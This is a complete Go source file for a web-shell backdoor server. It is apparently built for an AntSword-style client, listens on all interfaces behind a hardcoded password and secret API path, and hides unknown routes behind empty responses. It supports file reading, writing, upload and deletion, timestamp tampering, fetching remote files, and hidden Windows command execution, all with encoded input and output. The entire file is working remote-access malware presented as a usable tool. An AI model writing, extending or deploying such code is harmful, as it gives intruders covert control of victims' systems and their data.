package main

import (
	"bufio"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/shirou/gopsutil/v3/host"
	"golang.org/x/text/encoding/simplifiedchinese"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

const LISTEN = "0.0.0.0:62847"
const PWD = "S1lLyAQNXYUASEDFLVBWSFWECSSVS1lLy"
const API = "S1lLyXCVBRTSDBAVWERHHWARTGJRS1lLy"
const ENCODER = "base64"           // "" or "base64" or "hex"
const RETURN_ENCODE = "hex_base64" // "" or "base64" or "hex" or "hex_base64"
const OUT_PREFIX = "->|"           // 数据分割前缀符
const OUT_SUFFIX = "|<-"           // 数据分割后缀符

func Decoder(enstr string) string {
	bstring := []byte("")
	switch ENCODER {
	case "hex":
		bstring, _ = hex.DecodeString(enstr)
	case "base64":
		bstring, _ = base64.StdEncoding.DecodeString(enstr)
	default:
		bstring = []byte(enstr)
	}
	return string(bstring)
}

func Encoder(enstr string) string {
	var bstring string
	switch RETURN_ENCODE {
	case "hex":
		bstring = hex.EncodeToString([]byte(enstr))
	case "base64":
		bstring = base64.StdEncoding.EncodeToString([]byte(enstr))
	case "hex_base64":
		bstring = hex.EncodeToString([]byte(base64.StdEncoding.EncodeToString([]byte(enstr))))
	default:
		bstring = enstr
	}
	return bstring
}

func TimeStampToTime(timestamp int64) string {
	return time.Unix(timestamp, 0).Format(time.DateTime)
}

func BaseInfo() string {
	currentPath, _ := os.Getwd()
	ret := currentPath + "\t"
	if strings.Index(currentPath, "/") == 0 {
		ret += "/"
	} else {
		for i := int('C'); i < int('C')+23; i++ {
			vol := string(rune(i)) + ":"
			_, err := os.Stat(vol)
			if err == nil {
				ret += vol
			} else {
				break
			}
		}
	}
	ret += "\t"
	n, _ := host.Info()
	sysType := n.OS
	ret = ret + sysType + " "
	comName := n.Hostname
	ret = ret + comName + " "
	ret = ret + fmt.Sprintf("%s %s", strings.Split(n.PlatformVersion, ".")[0], n.PlatformVersion) + " "
	arch := n.KernelArch + "_" + runtime.GOARCH
	ret = ret + arch + "\t"
	currentUser, _ := user.Current()
	ret = ret + currentUser.Username
	return ret
}

func FileTreeCode(d string) string {
	ret := ""
	files, err := os.ReadDir(fmt.Sprintf("%s", d))
	if err != nil {
		return "ERROR:// Path Not Found or No Permission!1"
	}
	for _, file := range files {
		info, err := os.Stat(d + string(os.PathSeparator) + file.Name())
		if err != nil {
			return "ERROR:// Path Not Found or No Permission!2"
		}
		if info.IsDir() {
			ret += fmt.Sprintf("%s\t%s\t%d\t%s\n", file.Name()+"/", TimeStampToTime(info.ModTime().Unix()), info.Size(), info.Mode())
		} else {
			ret += fmt.Sprintf("%s\t%s\t%d\t%s\n", file.Name(), TimeStampToTime(info.ModTime().Unix()), info.Size(), info.Mode())
		}

	}
	return ret
}

func ReadFileCode(path string) string {
	file, err := os.Open(path)
	if err != nil {
		return "ERROR:// Path Not Found or No Permission!"
	}
	bytes, err2 := io.ReadAll(file)
	if err2 != nil {
		return "ERROR:// Path Not Found or No Permission!"
	}
	ret := string(bytes)
	return ret
}

func WriteFileCode(path string, content string) string {
	file, err2 := os.OpenFile(path, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0666)
	_ = file.Truncate(0)
	_, _ = file.Seek(0, 0)
	if err2 != nil {
		return "0"
	}
	_, err3 := fmt.Fprint(file, content)
	if err3 != nil {
		return "0"
	}
	_ = file.Close()
	return "1"
}

func DeleteFileOrDirCode(path string) string {
	info, _ := os.Stat(path)
	if info.IsDir() {
		err := os.RemoveAll(path)
		if err != nil {
			return "0"
		}
	} else {
		err := os.Remove(path)
		if err != nil {
			return "0"
		}
	}
	return "1"
}

func DownloadFileCode(path string) []byte {
	info, err := os.Stat(path)
	if err != nil {
		return []byte("ERROR:// Path Not Found or No Permission!")
	}
	file, err1 := os.Open(path)
	if err1 != nil {
		return []byte("ERROR:// Path Not Found or No Permission!")
	}
	buff := make([]byte, info.Size())
	for {
		lens, err := file.Read(buff)
		if err == io.EOF || lens < 0 {
			break
		}
	}
	_ = file.Close()
	return buff
}

func UploadFileCode(path string, content []byte) string {
	if err := os.WriteFile(path, content, 0666); err != nil {
		return "0"
	}
	return "1"
}

func FileCopy(src, dst string) error {
	var err error
	var srcfd *os.File
	var dstfd *os.File
	var srcinfo os.FileInfo

	if srcfd, err = os.Open(src); err != nil {
		return err
	}
	defer srcfd.Close()

	if dstfd, err = os.Create(dst); err != nil {
		return err
	}
	defer dstfd.Close()

	if _, err = io.Copy(dstfd, srcfd); err != nil {
		return err
	}
	if srcinfo, err = os.Stat(src); err != nil {
		return err
	}
	return os.Chmod(dst, srcinfo.Mode())
}

func DirCopy(src string, dst string) error {
	var err error
	var fds []os.FileInfo
	var srcinfo os.FileInfo
	if srcinfo, err = os.Stat(src); err != nil {
		return err
	}
	if err = os.MkdirAll(dst, srcinfo.Mode()); err != nil {
		return err
	}
	if fds, err = ioutil.ReadDir(src); err != nil {
		return err
	}
	for _, fd := range fds {
		srcfp := path.Join(src, fd.Name())
		dstfp := path.Join(dst, fd.Name())
		if fd.IsDir() {
			if err = DirCopy(srcfp, dstfp); err != nil {
				fmt.Println(err)
			}
		} else {
			if err = FileCopy(srcfp, dstfp); err != nil {
				fmt.Println(err)
			}
		}
	}
	return nil
}

func CopyFileOrDirCode(oldPath string, newPath string) string {
	stat, err := os.Stat(oldPath)
	if err != nil {
		return "0"
	}
	if stat.IsDir() {
		err := DirCopy(oldPath, newPath)
		if err != nil {
			return "0"
		}
	} else {
		err := FileCopy(oldPath, newPath)
		if err != nil {
			return "0"
		}
	}
	return "1"
}

func RenameFileOrDirCode(oldPath string, newPath string) string {
	err := os.Rename(oldPath, newPath)
	if err != nil {
		fmt.Println(err)
		return "0"
	}
	return "1"
}

func CreateDirCode(path string) string {
	err := os.Mkdir(path, 0666)
	if err != nil {
		return "0"
	}
	return "1"
}

func ModifyFileOrDirTimeCode(path string, newTime string) string {
	stamp, _ := time.ParseInLocation(time.DateTime, newTime, time.Local)
	err := os.Chtimes(path, stamp, stamp)
	if err != nil {
		return "0"
	}
	return "1"
}

func WgetCode(url string, savepath string) string {
	res, err := http.Get(url)
	if err != nil {
		return "0 filename need"
	}
	defer res.Body.Close()
	st, _ := os.Stat(savepath)
	if st.IsDir() {
		uri := strings.Split(url, "?")[0]
		names := strings.Split(uri, "/")
		savepath = savepath + string(os.PathSeparator) + strconv.FormatInt(time.Now().Unix(), 10) + "_" + names[len(names)-1]
	}
	out, err2 := os.Create(savepath)
	if err2 != nil {
		return "0"
	}
	defer out.Close()
	wt := bufio.NewWriter(out)
	_, _ = io.Copy(wt, res.Body)
	_ = wt.Flush()
	return "1"
}

func ExecuteCommandCode(cmdPath string, command string) string {
	var out []byte
	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("cmd")
		cmd.SysProcAttr = &syscall.SysProcAttr{CmdLine: fmt.Sprintf(`/c %s`, command), HideWindow: true}
		out, _ = cmd.CombinedOutput()
		out, _ = simplifiedchinese.GB18030.NewDecoder().Bytes(out)
	}
	return string(out)
}

func showDatabases(encode string, conf string) string {
	return "ERROR:// Not Implement"
}

func showTables(encode string, conf string, dbname string) string {
	return "ERROR:// Not Implement"
}

func showColumns(encode string, conf string, dbname string, table string) string {
	return "ERROR:// Not Implement"
}

func query(encode string, conf string, sql string) string {
	return "ERROR:// Not Implement"
}

func Sh31lHandler(context *gin.Context) {
	ret := ""
	values := context.PostForm(PWD)
	z0 := Decoder(context.PostForm("z0"))
	z1 := Decoder(context.PostForm("z1"))
	z2 := Decoder(context.PostForm("z2"))
	z3 := Decoder(context.PostForm("z3"))
	switch values {
	case "A":
		ret = BaseInfo()
	case "B":
		ret = FileTreeCode(z1)
	case "C":
		ret = ReadFileCode(z1)
	case "D":
		ret = WriteFileCode(z1, z2)
	case "E":
		ret = DeleteFileOrDirCode(z1)
	case "F":
		ret = string(DownloadFileCode(z1))
	case "U":
		ret = UploadFileCode(z1, []byte(z2))
	case "H":
		ret = CopyFileOrDirCode(z1, z2)
	case "I":
		ret = RenameFileOrDirCode(z1, z2)
	case "J":
		ret = CreateDirCode(z1)
	case "K":
		ret = ModifyFileOrDirTimeCode(z1, z2)
	case "L":
		ret = WgetCode(z1, z2)
	case "M":
		ret = ExecuteCommandCode(z1, z2)
	case "N":
		ret = showDatabases(z0, z1)
	case "O":
		ret = showTables(z0, z1, z2)
	case "P":
		ret = showColumns(z0, z1, z2, z3)
	case "Q":
		ret = query(z0, z1, z2)
	}
	context.String(http.StatusOK, OUT_PREFIX+Encoder(ret)+OUT_SUFFIX)
}

func r404(c *gin.Context) {
	c.String(200, "")
}

func main() {
	gin.SetMode(gin.ReleaseMode)
	gin.DefaultWriter = io.Discard
	r := gin.Default()
	r.NoRoute(r404)
	r.POST("/"+API, Sh31lHandler)
	err3 := r.Run(LISTEN)
	if err3 != nil {
		return
	}
}
